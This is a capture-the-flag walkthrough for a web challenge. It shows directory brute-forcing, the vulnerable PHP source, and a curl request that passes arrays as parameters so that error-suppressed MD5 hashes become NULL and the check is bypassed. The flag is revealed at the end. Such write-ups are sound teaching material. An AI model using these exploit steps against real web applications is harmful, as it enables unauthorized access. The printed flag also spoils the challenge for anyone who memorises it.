# Solve concmarks
#### https://cybertalents.com/challenges/web/concmarks

![alt text](image.png)

### Run Directory bruteforce
`dirsearch -u http://wcamxwl32pue3e6mekgvd1gf9zrqj6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
*you can find the output in [Directories.txt](Directories.txt)*

In the source code we found:
```html
<!--FILE=> sourceXXXX -->
<!--XXXX are numbers > 7000 & < 9000 -->
```

![alt text](image-1.png)

### Bruteforce attack to find the source file
```php
include('flag.php');	


if( @$_GET['n1'] && @$_GET['n2'] )
{
	$input1 = $_GET['n1'];
	$input2 = $_GET['n2'];
	if( $input1 !== $input2 && @hash("md5", $salt.$input1) === @hash("md5", $salt. $input2) )
	{
		echo $flag;

	} else {

		echo "Sorry this value not valid.";
	}
} else{
	exit();
}

```

### Code breakdown
`$input1 !== $input2`: Ensures that the values of n1 and n2 are not the same.
`@hash("md5", $salt.$input1) === @hash("md5", $salt. $input2)`: Checks if the MD5 hash of input1 concatenated with `$salt` is equal to the MD5 hash of input2 concatenated with `$salt`.
Note that `@` symbol **suppresses errors**. So if there's an error in the hash function, it might return NULL. If both hashes result in errors, their return values (`NULL`) would be **identical**.

### Try to pass the values to n1 & n2
`curl "http://wcamxwl32pue3e6mekgvd1gf9zrqj6zqdkgxu639-web.cybertalentslabs.com/?n1=test&n2=test2"`
Sorry this value not valid.

### Exploit
To exploit the PHP type juggling and error suppression, send arrays as `n1` and `n2` to trigger NULL hash values that satisfy the === comparison

`curl "http://wcamxwl32pue3e6mekgvd1gf9zrqj6zqdkgxu639-web.cybertalentslabs.com/?n1[]=a&n2[]=b"`

PHP treats `$salt.$input1` as `string + array` → invalid operation → `hash(...) === hash(...)` → Both return `NULL`, which are strictly equal `(NULL === NULL)`.

flag : FLAG{K0nC473n4710N_!5_50_C00l}

>Find More on ==> github.com/MedhatHassan 
